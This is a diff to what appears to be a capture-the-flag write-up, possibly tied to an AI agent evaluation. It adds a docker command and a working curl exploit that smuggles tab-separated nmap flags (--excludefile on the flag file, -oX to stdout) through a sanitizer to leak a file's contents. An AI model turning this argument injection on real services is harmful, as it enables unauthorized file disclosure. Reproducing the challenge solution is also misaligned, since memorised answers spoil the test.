@@ -1,3 +1,7 @@
+```
+docker run -d -p 1337:1337 --name scanner scanner_service
+```
+
 ## Solution
 The sanitizer escapes all common shell metacharacters but misses tab characters (`\t`). Since nmap treats tabs as argument delimiters, you can inject arbitrary nmap flags after the port.
 ```bash
@@ -33,6 +37,14 @@ curl -s -X POST http://localhost:1337/ \
 - Dead-end: "shell metacharacter injection exhausted" → should pivot to tab-based argument injection
 
 That last point is exactly what FAEM's dead-end logic is designed to catch.
+
+
+## Working Exploit:
+The actual mechanism: nmap tries to resolve the flag filename's _contents_ as a hostname (since `--excludefile` expects a list of hosts/IPs to exclude, and the flag's contents don't parse as one), producing an error like `Error resolving name "SEKAI{flag_contents}": Name does not resolve` — and that error message itself leaks the flag
+```
+curl -X POST http://localhost:1337/ \
+  --data-urlencode $'service=127.0.0.1:1337\t--excludefile\t/flag-????????????????????????????????.txt\t-oX\t/proc/self/fd/1'
+```
 
 ---
 ## Run Command:
